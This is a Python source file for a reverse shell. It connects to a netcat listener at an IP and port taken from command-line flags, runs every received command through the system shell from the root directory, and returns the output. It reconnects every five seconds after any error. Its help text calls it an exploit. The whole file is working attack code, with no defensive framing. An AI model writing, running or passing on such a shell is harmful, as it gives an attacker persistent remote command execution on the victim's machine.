import subprocess
import socket
import os
import time
import sys

args = sys.argv

server_ip = '127.0.0.1' # default netcat listener ip 
server_port = 8888 # default netcat listener port

argCounter = 0
for arg in args:
    if arg == "-i":
        server_ip = args[argCounter + 1]
    if arg == "-p":
        server_port = int(args[argCounter + 1])

    if arg == "-h":
        print('To use this exploit do: "python rs-v-000001.py -i 127.0.0.1 -p 8888"')
        exit()

    argCounter += 1



def main():
    try: 
        

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        os.chdir('/')  # Change to the root directory

        while True:
            try:
                command = client.recv(4096).decode()

                if command.strip().lower() == "exit":
                    break

                if command.startswith("cd "):
                    # Change directory command support
                    directory = command.split("cd ")[1].strip()
                    try:
                        os.chdir(directory)
                        output = f"Changed directory to {os.getcwd()}\n".encode()
                    except Exception as e:
                        output = str(e).encode()
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                output += (f"{os.getcwd()}> ".encode())
                client.sendall(bytes(output))  # Send encoded output
            except Exception as e:
                client.close()
                time.sleep(5) 
                main() # reconnect after error
    except Exception as e:
        time.sleep(5)
        main() # try reconnectiong again


if __name__ == '__main__':
    main()
